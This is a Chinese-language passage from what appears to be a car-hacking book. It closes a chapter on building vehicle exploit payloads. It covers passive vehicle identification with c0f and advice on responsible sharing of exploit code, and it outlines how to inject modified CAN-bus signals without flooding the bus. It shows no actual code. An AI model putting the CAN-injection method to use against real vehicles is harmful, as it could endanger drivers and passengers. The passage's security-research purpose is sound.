*c0f 并不是唯一能快速检测你所在车辆类型的方式；其输出可以用于更多创造性的方法来在不传输数据包的情况下识别你的目标系统。未来可能会出现能够躲避 c0f 的系统，或者我们可能会发现一种更新、更高效的方式来被动识别目标车辆。*

### 负责任的漏洞利用

你现在已经知道如何识别你的漏洞是否正在目标上运行，甚至如何在不发送任何数据包的情况下进行检查。你不想用虚假的信号淹没总线，因为这会导致网络瘫痪，而在错误的车辆上发送错误信号可能会带来未知的影响。

在共享漏洞代码时，考虑添加一个虚假的身份验证程序或完整的 VIN 检查，以防止有人随意启动你的漏洞。这至少会迫使脚本小子了解足够的代码，以便修改它以适应正确的车辆。在攻击基于间隔的 CAN 信号时，正确的做法是监听你想要修改的 CAN ID，当你通过读取请求接收到它时，只修改你想要更改的字节，并立即将其发送回去。这将防止泛洪，立即覆盖有效信号，并保留信号中未被攻击目标的其他属性。

安全开发人员需要访问漏洞利用工具，以测试其防护措施的强度。攻击和防御团队的新想法需要共享，但必须负责任地进行共享。

### 总结

在本章中，你学习了如何从研究中构建有效的载荷。你将概念验证的 C 代码转换为汇编语言中的载荷，再将汇编语言转换为可以与 Metasploit 一起使用的 shellcode，使得你的载荷更加模块化。你还学习了确保你的载荷不会意外地在意外车辆上运行的安全方法，通过 VIN 解码和被动 CAN 总线识别技术来实现。你甚至学习了一些防止脚本小子窃取你的代码并将其注入随机车辆的方法。
